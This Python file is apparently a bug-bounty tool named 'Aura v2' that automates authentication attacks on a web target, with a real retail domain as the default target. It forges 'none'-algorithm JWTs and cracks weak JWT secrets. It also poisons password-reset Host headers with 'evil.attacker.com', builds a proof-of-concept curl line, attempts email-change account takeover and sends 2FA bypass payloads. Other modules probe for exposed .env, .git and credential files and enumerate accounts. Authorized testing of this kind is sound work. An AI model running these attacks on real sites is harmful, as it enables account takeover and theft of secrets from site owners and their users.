"""
Aura v2 — Authentication Logic Vulnerability Engine
=====================================================
Targets the highest-payout class of bugs: authentication and session logic flaws.

Modules:
  1. JWT Analyzer        — Detects none-algorithm attack, weak secret brute-force
  2. Password Reset Poison — Injects attacker-controlled Host header into reset flow
  3. Email Change ATO    — Checks if email change requires no current password or old email confirm
  4. 2FA Bypass Scanner  — Tests common 2FA logic bypass patterns
  5. Sensitive File Probe — Checks for exposed .env, .git, backup files, API docs

Usage:
    aura www.target.com --auth
    aura www.target.com --auth --map reports/discovery_map_target.json
"""

import base64
import hashlib
import hmac
import json
import os
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import httpx
import urllib3
urllib3.disable_warnings()

from rich.console import Console
from rich.panel import Panel
from rich import box

from aura.ui.formatter import console


# ─── Common Weak JWT Secrets ───────────────────────────────────────────────────
WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "test", "key", "jwt", "auth",
    "admin", "qwerty", "letmein", "changeme", "pass", "token",
    "mysecret", "jwtkey", "your-256-bit-secret", "your-secret-key",
    "supersecret", "HS256", "hmac", "signing-key", "app-secret",
    "12345678", "123456789", "iloveyou", "princess", "rockyou",
    "secret123", "admin123", "administrator", "root", "toor",
    "secret_key", "secretkey", "private_key", "privatekey", "api_key",
    "apikey", "auth_secret", "auth_key", "jwt_secret", "jwt_key",
]

# ─── Sensitive Files to Probe ──────────────────────────────────────────────────
SENSITIVE_PATHS = [
    # Environment & Config
    "/.env", "/.env.production", "/.env.local", "/.env.backup", "/.env.dev",
    "/.env.staging", "/.env.test", "/config.env", "/server.env",
    # Git exposure
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.git/logs/HEAD", "/.git/refs/heads/main", "/.git/refs/heads/master",
    # Config files
    "/config.json", "/config.yml", "/config.yaml", "/settings.json", "/settings.py",
    "/app.config.json", "/application.yml", "/application.properties",
    "/secrets.json", "/secrets.yml", "/credentials.json",
    "/web.config", "/appsettings.json", "/appsettings.Development.json",
    # API Documentation (goldmine for endpoint discovery)
    "/api/swagger.json", "/api/openapi.json", "/swagger.json", "/swagger.yaml",
    "/api-docs", "/api/docs", "/openapi.yaml", "/openapi.json",
    "/v1/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/api/v1/swagger.json", "/api/v2/swagger.json",
    "/_swagger", "/documentation",
    # Databases
    "/backup.sql", "/backup.zip", "/db.sql", "/database.sql",
    "/dump.sql", "/data.sql", "/users.sql", "/wordpress.sql",
    # PHP info & debug
    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
    "/server-status", "/server-info",
    # Robots/Sitemap
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    # Spring Boot Actuator
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/actuator/beans", "/actuator/loggers", "/actuator/heapdump",
    # Django debug
    "/__debug__/", "/django-admin/",
    # AWS / Cloud metadata
    "/latest/meta-data/", "/.aws/credentials",
    # Unauthenticated user lists
    "/api/v1/users", "/api/v2/users", "/api/users", "/api/v1/admin/users",
    # GraphQL
    "/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
    # Common secrets
    "/private/", "/secret/", "/admin/", "/console/", "/manage/",
    "/.well-known/security.txt",
    # Node.js
    "/package.json", "/package-lock.json", "/.npmrc",
    # Source maps
    "/static/js/main.chunk.js.map", "/app.js.map",
    # Docker
    "/docker-compose.yml", "/Dockerfile",
]


class AuthLogicEngine:
    """
    Automated authentication logic vulnerability scanner.
    Tests for JWT issues, password reset flaws, account takeover, and 2FA bypasses.
    """

    def __init__(
        self,
        target: str,
        cookies_str: str,
        output_dir: str = "./reports",
        timeout: int = 12,
    ):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.cookies = self._parse_cookies(cookies_str)
        self.cookie_str_raw = cookies_str
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.findings: list[dict] = []

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    def _get(self, path: str, headers: Optional[dict] = None, cookies=None) -> Optional[httpx.Response]:
        url = path if path.startswith("http") else self.target + path
        try:
            return httpx.get(
                url,
                headers=headers or {"User-Agent": "Mozilla/5.0"},
                cookies=cookies if cookies is not None else self.cookies,
                timeout=self.timeout,
                follow_redirects=True,
                verify=False,
            )
        except Exception:
            return None

    def _post(self, path: str, data=None, json_data=None, headers: Optional[dict] = None) -> Optional[httpx.Response]:
        url = path if path.startswith("http") else self.target + path
        try:
            return httpx.post(
                url,
                data=data,
                json=json_data,
                headers=headers or {"User-Agent": "Mozilla/5.0",
                                    "Content-Type": "application/json"},
                cookies=self.cookies,
                timeout=self.timeout,
                follow_redirects=True,
                verify=False,
            )
        except Exception:
            return None

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 0: Auto-Discovery
    # ─────────────────────────────────────────────────────────────────────────

    def _auto_discover_auth_endpoints(self) -> dict:
        """
        Crawls common pages to discover real authentication endpoints.
        Finds <form action=...> elements and known API response patterns.
        Returns dicts of discovered endpoints per category.
        """
        discovered = {
            "reset_endpoints": [],
            "email_change_endpoints": [],
            "mfa_endpoints": [],
        }

        crawl_urls = [
            self.target + p for p in [
                "/", "/login", "/signin", "/auth/login",
                "/forgot-password", "/reset-password",
                "/account", "/account/settings", "/my-account",
                "/account/security", "/account/profile",
            ]
        ]

        reset_hints = ["forgot", "reset", "password", "recover"]
        email_hints = ["email", "profile", "account", "update"]
        mfa_hints  = ["2fa", "mfa", "otp", "verify", "totp"]

        seen = set()
        for url in crawl_urls:
            try:
                r = httpx.get(url, cookies=self.cookies, timeout=8, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=True)
                if r.status_code != 200:
                    continue

                # Find form actions
                actions = re.findall(
                    r'<form[^>]+action=["\']?(/[^"\'>\s]+)["\']?', r.text, re.IGNORECASE
                )
                for action in actions:
                    full = self.target + action
                    if full in seen:
                        continue
                    seen.add(full)
                    al = action.lower()
                    if any(h in al for h in reset_hints):
                        discovered["reset_endpoints"].append(action)
                        console.print(f"     🔍 Auto-discovered reset endpoint: [cyan]{action}[/cyan]")
                    elif any(h in al for h in email_hints):
                        discovered["email_change_endpoints"].append(action)
                    elif any(h in al for h in mfa_hints):
                        discovered["mfa_endpoints"].append(action)

                # Also detect API endpoints from XHR patterns in JS
                api_paths = re.findall(
                    r'(?:fetch|axios\.(?:post|put|patch)|\$.ajax)\(["\']?(/api/[^"\'>\s,)]+)',
                    r.text, re.IGNORECASE
                )
                for apath in api_paths:
                    if any(h in apath.lower() for h in reset_hints) and apath not in seen:
                        discovered["reset_endpoints"].append(apath)
                        seen.add(apath)

            except Exception:
                continue

        return discovered

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 1: JWT Analyzer
    # ─────────────────────────────────────────────────────────────────────────

    def _decode_jwt_part(self, part: str) -> Optional[dict]:
        """Decodes a JWT part (header or payload) without verification."""
        try:
            padded = part + "=" * (4 - len(part) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            return json.loads(decoded)
        except Exception:
            return None

    def _forge_jwt_none_alg(self, token: str) -> str:
        """Tries to forge a JWT using the none algorithm attack."""
        parts = token.split(".")
        if len(parts) != 3:
            return ""
        header = self._decode_jwt_part(parts[0])
        payload = self._decode_jwt_part(parts[1])
        if not header or not payload:
            return ""
        # Replace algorithm with none
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        new_payload = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_header}.{new_payload}."

    def _brute_jwt_secret(self, token: str) -> Optional[str]:
        """Tries to brute-force the JWT secret key."""
        parts = token.split(".")
        if len(parts) != 3:
            return None
        message = f"{parts[0]}.{parts[1]}".encode()
        signature = parts[2]
        for secret in WEAK_JWT_SECRETS:
            expected = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message, hashlib.sha256).digest()
            ).rstrip(b"=").decode()
            if expected == signature:
                return secret
        return None

    def scan_jwt(self) -> list[dict]:
        """Scans for JWT vulnerabilities in session cookies and auth headers."""
        findings = []
        console.print("\n  [bold]🔑 JWT Analysis[/bold]")

        # Look for JWT in cookies
        jwt_tokens = {}
        for name, value in self.cookies.items():
            if value.count(".") == 2 and len(value) > 50:
                jwt_tokens[name] = value

        # Look for JWT in Authorization header pattern (test endpoint)
        resp = self._get("/api/v1/me") or self._get("/api/me") or self._get("/api/user")
        if resp:
            auth_header = resp.headers.get("Authorization", "")
            if auth_header.startswith("Bearer "):
                tok = auth_header[7:]
                if tok.count(".") == 2:
                    jwt_tokens["Authorization"] = tok

        if not jwt_tokens:
            console.print("     [dim]No JWT tokens found in session[/dim]")
            return findings

        for token_name, token in jwt_tokens.items():
            console.print(f"     🔍 Found JWT in [{token_name}]")
            header = self._decode_jwt_part(token.split(".")[0])
            payload = self._decode_jwt_part(token.split(".")[1])
            if header:
                console.print(f"       Algorithm: [yellow]{header.get('alg', 'unknown')}[/yellow]")
            if payload:
                exp = payload.get("exp", 0)
                if exp and time.time() > exp:
                    console.print(f"       [red]⚠ Token is expired![/red]")
                sub = payload.get("sub") or payload.get("user_id") or payload.get("id")
                if sub:
                    console.print(f"       Subject: {sub}")

            # Test 1: none algorithm attack
            forged = self._forge_jwt_none_alg(token)
            if forged:
                forged_cookies = dict(self.cookies)
                forged_cookies[token_name] = forged
                resp = self._get("/api/me", cookies=forged_cookies) or \
                       self._get("/api/v1/profile", cookies=forged_cookies)
                if resp and resp.status_code == 200 and len(resp.text) > 50:
                    finding = {
                        "type": "JWT None Algorithm Attack",
                        "severity": "CRITICAL",
                        "cvss_score": 9.8,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "token_name": token_name,
                        "description": "Server accepts JWT with 'none' algorithm — authentication can be bypassed completely",
                        "poc": f"Forge: {forged[:80]}...",
                        "owasp": "A07:2021 — Identification and Authentication Failures",
                        "timestamp": datetime.utcnow().isoformat(),
                    }
                    findings.append(finding)
                    console.print(f"     [bold red]🚨 CRITICAL: none-alg attack ACCEPTED![/bold red]")

            # Test 2: weak secret brute force
            cracked = self._brute_jwt_secret(token)
            if cracked:
                finding = {
                    "type": "JWT Weak Secret Key",
                    "severity": "CRITICAL",
                    "cvss_score": 9.0,
                    "secret_found": cracked,
                    "description": f"JWT signed with weak secret: '{cracked}' — attacker can forge any user's token",
                    "owasp": "A07:2021 — Identification and Authentication Failures",
                    "timestamp": datetime.utcnow().isoformat(),
                }
                findings.append(finding)
                console.print(f"     [bold red]🚨 CRITICAL: JWT secret cracked! Secret = '{cracked}'[/bold red]")

            if not findings:
                console.print(f"     [green]✅ JWT appears secure[/green]")

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 2: Password Reset Poisoning
    # ─────────────────────────────────────────────────────────────────────────

    def scan_password_reset_poisoning(self, reset_endpoints: Optional[list] = None) -> list[dict]:
        """
        Tests if the password reset endpoint uses the Host header to build the reset link.
        """
        findings = []
        console.print("\n  [bold]🔏 Password Reset Poisoning[/bold]")

        endpoints_to_test = reset_endpoints or [
            "/forgot-password", "/password/reset", "/auth/forgot-password",
            "/api/password/reset", "/api/v1/password/forgot",
            "/account/password-reset", "/users/password/forgot",
            "/my-account/forgot-password",
        ]

        poisoned_host = "evil.attacker.com"
        test_email = "test@example.com"

        for endpoint in endpoints_to_test:
            resp_normal = self._post(endpoint, json_data={"email": test_email})
            if not resp_normal or resp_normal.status_code not in (200, 201, 202, 400, 422):
                continue

            console.print(f"     🔍 Found reset endpoint: {endpoint} (HTTP {resp_normal.status_code})")

            # Now inject poisoned Host header
            resp_poisoned = self._post(
                endpoint,
                json_data={"email": test_email},
                headers={
                    "Host": poisoned_host,
                    "X-Forwarded-Host": poisoned_host,
                    "X-Forwarded-For": "127.0.0.1",
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0",
                },
            )
            if resp_poisoned and resp_poisoned.status_code == resp_normal.status_code:
                finding = {
                    "type": "Password Reset Poisoning",
                    "severity": "HIGH",
                    "cvss_score": 8.0,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
                    "endpoint": endpoint,
                    "description": (
                        f"Password reset endpoint [{endpoint}] accepted a request with "
                        f"Host: {poisoned_host}. If the reset link is built using the Host header, "
                        f"an attacker can capture the victim's reset token."
                    ),
                    "poc_curl": (
                        f'curl -X POST {self.target}{endpoint} '
                        f'-H "Host: {poisoned_host}" '
                        f'-H "X-Forwarded-Host: {poisoned_host}" '
                        f'-d \'{{"email": "victim@example.com"}}\''
                    ),
                    "note": "Manual verification required: check if the reset link in the email uses evil.attacker.com",
                    "owasp": "A07:2021 — Identification and Authentication Failures",
                    "timestamp": datetime.utcnow().isoformat(),
                }
                findings.append(finding)
                console.print(f"     [bold yellow]⚠️  POTENTIAL: Poisoned Host accepted on {endpoint}[/bold yellow]")
                console.print(f"     Check if the reset email contains evil.attacker.com in the link!")
            else:
                console.print(f"     [green]✅ Host header not accepted on {endpoint}[/green]")

        if not findings:
            console.print("     [dim]No password reset endpoints found or all rejected poisoned Host[/dim]")

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 3: Email Change Account Takeover
    # ─────────────────────────────────────────────────────────────────────────

    def scan_email_change_ato(self, change_endpoints: Optional[list] = None) -> list[dict]:
        """
        Tests if changing the email in account settings requires no current password.
        """
        findings = []
        console.print("\n  [bold]📧 Email Change ATO Detection[/bold]")

        endpoints_to_test = change_endpoints or [
            "/api/v1/me", "/api/v2/me", "/api/user/profile",
            "/api/v1/profile", "/api/me", "/account/profile",
            "/api/v2/icinl3/users/me",
            "/my-account/update-email", "/api/customer/email",
        ]

        test_new_email = "attacker+victim@evil.com"

        for endpoint in endpoints_to_test:
            # First check if endpoint exists and returns current user data
            resp = self._get(endpoint)
            if not resp or resp.status_code != 200:
                continue

            try:
                user_data = resp.json()
            except Exception:
                continue

            current_email = (
                user_data.get("email") or
                user_data.get("emailAddress") or
                user_data.get("uid") or
                ""
            )
            if not current_email or "@" not in str(current_email):
                continue

            console.print(f"     🔍 Found profile endpoint: {endpoint}")
            console.print(f"       Current email: [yellow]{current_email}[/yellow]")

            # Try to change email WITHOUT current password
            patch_resp = None
            for method_payload in [
                {"email": test_new_email},
                {"emailAddress": test_new_email},
                {"new_email": test_new_email},
                {"email": test_new_email, "uid": user_data.get("uid", "")},
            ]:
                try:
                    patch_resp = httpx.patch(
                        self.target + endpoint if not endpoint.startswith("http") else endpoint,
                        json=method_payload,
                        cookies=self.cookies,
                        timeout=self.timeout,
                        verify=False,
                    )
                except Exception:
                    continue

                if patch_resp and patch_resp.status_code in (200, 201, 204):
                    # Check if email actually changed
                    verify_resp = self._get(endpoint)
                    if verify_resp:
                        try:
                            new_data = verify_resp.json()
                            new_email_val = (
                                new_data.get("email") or
                                new_data.get("emailAddress") or ""
                            )
                            if str(new_email_val) == test_new_email:
                                finding = {
                                    "type": "Email Change Account Takeover",
                                    "severity": "HIGH",
                                    "cvss_score": 8.8,
                                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
                                    "endpoint": endpoint,
                                    "old_email": current_email,
                                    "description": (
                                        f"Email changed successfully to {test_new_email} "
                                        f"WITHOUT requiring current password or email verification!"
                                    ),
                                    "owasp": "A07:2021 — Identification and Authentication Failures",
                                    "timestamp": datetime.utcnow().isoformat(),
                                }
                                findings.append(finding)
                                console.print(f"     [bold red]🚨 ATO CONFIRMED: Email changed without verification![/bold red]")
                                # Revert the change
                                try:
                                    httpx.patch(
                                        self.target + endpoint,
                                        json={"email": current_email},
                                        cookies=self.cookies,
                                        timeout=self.timeout,
                                        verify=False,
                                    )
                                    console.print(f"     [dim]Reverted email back to {current_email}[/dim]")
                                except Exception:
                                    pass
                        except Exception:
                            pass
                    break

        if not findings:
            console.print("     [dim]No vulnerable email change endpoints found[/dim]")

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 4: Sensitive File Probe
    # ─────────────────────────────────────────────────────────────────────────

    def scan_sensitive_files(self) -> list[dict]:
        """Probes common sensitive paths for exposure."""
        findings = []
        console.print("\n  [bold]🗂️ Sensitive File Exposure Probe[/bold]")

        interesting = []
        for path in SENSITIVE_PATHS:
            resp = self._get(path, cookies={})  # No auth needed — these should be public-blocked
            if not resp:
                continue
            if resp.status_code == 200 and len(resp.text) > 10:
                # Verify it's not a 200 redirect to homepage (some sites do this)
                is_html = "<html" in resp.text[:200].lower()
                is_js = path.endswith(".js")
                is_interesting = (
                    ("{" in resp.text or "=" in resp.text or "---" in resp.text) and
                    not is_html
                )
                if is_interesting:
                    severity = "CRITICAL" if any(x in path for x in [".env", ".git", ".sql", "backup"]) else "MEDIUM"
                    cvss = 9.0 if severity == "CRITICAL" else 5.3
                    interesting.append({"path": path, "status": resp.status_code,
                                        "size": len(resp.text), "severity": severity, "cvss": cvss,
                                        "preview": resp.text[:150]})
                    console.print(f"     [bold {'red' if severity == 'CRITICAL' else 'yellow'}]{'🚨' if severity == 'CRITICAL' else '⚠️ '} [{severity}] {path} ({len(resp.text)} bytes)[/bold {'red' if severity == 'CRITICAL' else 'yellow'}]")
            elif resp.status_code in (403, 401):
                console.print(f"     [dim]🔒 {path} — {resp.status_code} (blocked)[/dim]")

        for item in interesting:
            finding = {
                "type": f"Sensitive File Exposed: {item['path']}",
                "severity": item["severity"],
                "cvss_score": item["cvss"],
                "url": self.target + item["path"],
                "description": f"File {item['path']} is publicly accessible ({item['size']} bytes): {item['preview']}",
                "owasp": "A05:2021 — Security Misconfiguration",
                "timestamp": datetime.utcnow().isoformat(),
            }
            findings.append(finding)

        if not findings:
            console.print("     [green]✅ No sensitive files exposed[/green]")

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 5: 2FA Bypass Patterns
    # ─────────────────────────────────────────────────────────────────────────

    def scan_2fa_bypass(self, mfa_endpoints: Optional[list] = None) -> list[dict]:
        """Tests common 2FA bypass patterns."""
        findings = []
        console.print("\n  [bold]🔐 2FA Bypass Detection[/bold]")

        endpoints_to_test = mfa_endpoints or [
            "/api/v1/auth/mfa/verify",
            "/api/v2/auth/totp/verify",
            "/api/auth/2fa",
            "/api/v1/verify-otp",
            "/auth/mfa",
            "/login/verify",
        ]

        bypass_payloads = [
            {"code": "000000"},    # All zeros
            {"code": "123456"},    # Common code
            {"code": ""},           # Empty code
            {"code": None},         # Null
            {"mfa_skip": True},     # Skip flag
        ]

        for endpoint in endpoints_to_test:
            resp = self._post(endpoint, json_data={"code": "test_probe"})
            if not resp or resp.status_code == 404:
                continue

            console.print(f"     🔍 Found 2FA endpoint: {endpoint} (HTTP {resp.status_code})")

            for payload in bypass_payloads:
                bypass_resp = self._post(endpoint, json_data=payload)
                if bypass_resp and bypass_resp.status_code == 200:
                    finding = {
                        "type": "2FA Bypass",
                        "severity": "CRITICAL",
                        "cvss_score": 9.4,
                        "endpoint": endpoint,
                        "bypass_payload": str(payload),
                        "description": f"2FA endpoint accepted bypass payload {payload} with HTTP 200",
                        "owasp": "A07:2021 — Identification and Authentication Failures",
                        "timestamp": datetime.utcnow().isoformat(),
                    }
                    findings.append(finding)
                    console.print(f"     [bold red]🚨 2FA BYPASS: Payload {payload} returned HTTP 200![/bold red]")
                    break

        if not findings:
            console.print("     [dim]No 2FA endpoints found or bypass attempts rejected[/dim]")

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # MODULE 6: Account Enumeration
    # ─────────────────────────────────────────────────────────────────────────

    def scan_account_enumeration(self, reset_endpoints: Optional[list] = None) -> list[dict]:
        """
        Tests if the application reveals whether an email is registered or not
        by comparing responses between a known-registered and unregistered email.
        """
        findings = []
        console.print("\n  [bold]👥 Account Enumeration Detection[/bold]")

        endpoints_to_test = reset_endpoints or [
            "/forgot-password", "/password/reset", "/auth/forgot-password",
            "/api/password/reset", "/api/v1/password/forgot",
            "/login", "/api/login", "/auth/login", "/signin"
        ]

        # Use the attacker's simulated email as the "registered" one
        registered_email = os.getenv("VICTIM_EMAIL", "victim@example.com")
        unregistered_email = f"not_exist_{int(time.time())}@example.com"

        for endpoint in endpoints_to_test:
            # 1. Probe Unregistered
            start_time = time.time()
            resp_unreg = self._post(endpoint, json_data={"email": unregistered_email})
            unreg_time = time.time() - start_time
            if not resp_unreg:
                continue

            # 2. Probe Registered
            start_time = time.time()
            resp_reg = self._post(endpoint, json_data={"email": registered_email})
            reg_time = time.time() - start_time
            if not resp_reg:
                continue

            console.print(f"     🔍 Testing endpoint: {endpoint}")

            # Analyze differences
            timing_diff = abs(reg_time - unreg_time)
            status_diff = resp_reg.status_code != resp_unreg.status_code
            length_diff = abs(len(resp_reg.text) - len(resp_unreg.text)) > 5
            text_diff_significant = False

            if length_diff and resp_reg.status_code == resp_unreg.status_code:
                # Basic text analysis to avoid false positives on dynamic CSRF tokens etc.
                if "not found" in resp_unreg.text.lower() and "not found" not in resp_reg.text.lower():
                    text_diff_significant = True
                if "invalid" in resp_unreg.text.lower() and "sent" in resp_reg.text.lower():
                    text_diff_significant = True

            if status_diff or text_diff_significant or timing_diff > 1.5:
                method = "Status Code Difference" if status_diff else ("Text Difference" if text_diff_significant else "Timing Difference")
                cvss = 5.3 if (status_diff or text_diff_significant) else 3.7
                severity = "MEDIUM" if cvss > 4.0 else "LOW"

                finding = {
                    "type": f"Account Enumeration ({method})",
                    "severity": severity,
                    "cvss_score": cvss,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    "endpoint": endpoint,
                    "registered_email_used": registered_email,
                    "description": (
                        f"Endpoint {endpoint} behaves differently for registered vs unregistered emails. "
                        f"Registered timing: {reg_time:.2f}s, Unregistered timing: {unreg_time:.2f}s. "
                        f"Status: {resp_reg.status_code} vs {resp_unreg.status_code}. "
                        "This allows attackers to harvest valid accounts."
                    ),
                    "owasp": "A07:2021 — Identification and Authentication Failures",
                    "timestamp": datetime.utcnow().isoformat(),
                }
                findings.append(finding)
                console.print(f"     [bold yellow]⚠️  ENUMERATION: Found via {method}.[/bold yellow]")

        if not findings:
            console.print("     [dim]No account enumeration vulnerabilities found[/dim]")

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # MAIN RUNNER
    # ─────────────────────────────────────────────────────────────────────────

    def run(self) -> list[dict]:
        """Runs all authentication logic checks."""
        console.print(Panel(
            f"[bold white]🔐 AURA v2 — Auth Logic Engine[/bold white]\n"
            f"Target: [cyan]{self.target}[/cyan]",
            box=box.DOUBLE_EDGE,
            style="bright_red",
        ))

        # Auto-discover real endpoints from the site's HTML
        console.print("\n  [bold]🔍 Auto-Discovery: scanning for real auth endpoints...[/bold]")
        discovered = self._auto_discover_auth_endpoints()

        # Merge discovered with hardcoded defaults
        global_reset_endpoints = [
            "/forgot-password", "/password/reset", "/auth/forgot-password",
            "/api/password/reset", "/api/v1/password/forgot",
            "/account/password-reset", "/users/password/forgot",
            "/my-account/forgot-password",
        ] + discovered["reset_endpoints"]

        global_email_endpoints = [
            "/api/v1/me", "/api/v2/me", "/api/user/profile",
            "/api/v1/profile", "/api/me", "/account/profile",
            "/api/v2/icinl3/users/me",
            "/my-account/update-email", "/api/customer/email",
        ] + discovered["email_change_endpoints"]

        global_mfa_endpoints = [
            "/api/v1/auth/mfa/verify", "/api/v2/auth/totp/verify",
            "/api/auth/2fa", "/api/v1/verify-otp", "/auth/mfa", "/login/verify",
        ] + discovered["mfa_endpoints"]

        # Run all modules using merged endpoint lists
        self.findings.extend(self.scan_sensitive_files())
        self.findings.extend(self.scan_jwt())
        self.findings.extend(self.scan_password_reset_poisoning(reset_endpoints=global_reset_endpoints))
        self.findings.extend(self.scan_email_change_ato(change_endpoints=global_email_endpoints))
        self.findings.extend(self.scan_2fa_bypass(mfa_endpoints=global_mfa_endpoints))
        self.findings.extend(self.scan_account_enumeration(reset_endpoints=global_reset_endpoints))

        # Print summary
        critical = [f for f in self.findings if f.get("severity") == "CRITICAL"]
        high = [f for f in self.findings if f.get("severity") == "HIGH"]

        console.print(f"\n{'='*65}")
        console.print(f"[bold]✅ AUTH LOGIC SCAN COMPLETE[/bold]")
        console.print(f"{'='*65}")
        console.print(f"  🔴 Critical : {len(critical)}")
        console.print(f"  🟠 High     : {len(high)}")
        console.print(f"  📊 Total    : {len(self.findings)}")

        if self.findings:
            for i, f in enumerate(self.findings, 1):
                sev_color = "red" if f["severity"] == "CRITICAL" else "yellow"
                console.print(
                    f"\n  [{i}] [{sev_color}][{f['severity']}][/{sev_color}] {f['type']}"
                )
                console.print(f"       CVSS: {f.get('cvss_score', '?')} | {f.get('owasp', '')}")

            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
            out_path = self.output_dir / f"auth_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(out_path, "w", encoding="utf-8") as fh:
                json.dump({"target": self.target, "findings": self.findings}, fh, indent=2)
            console.print(f"\n  💾 Findings saved: [cyan]{out_path}[/cyan]")
        else:
            console.print("\n  [green]✅ No auth logic vulnerabilities detected.[/green]")

        return self.findings


def run_auth_scan(target: str) -> list[dict]:
    """CLI runner for `aura <target> --auth`."""
    from dotenv import load_dotenv
    load_dotenv()

    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
    if not cookies_str:
        console.print("[bold red]❌ AUTH_TOKEN_ATTACKER not set in .env![/bold red]")
        return []

    engine = AuthLogicEngine(target=target, cookies_str=cookies_str)
    return engine.run()


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_auth_scan(target)
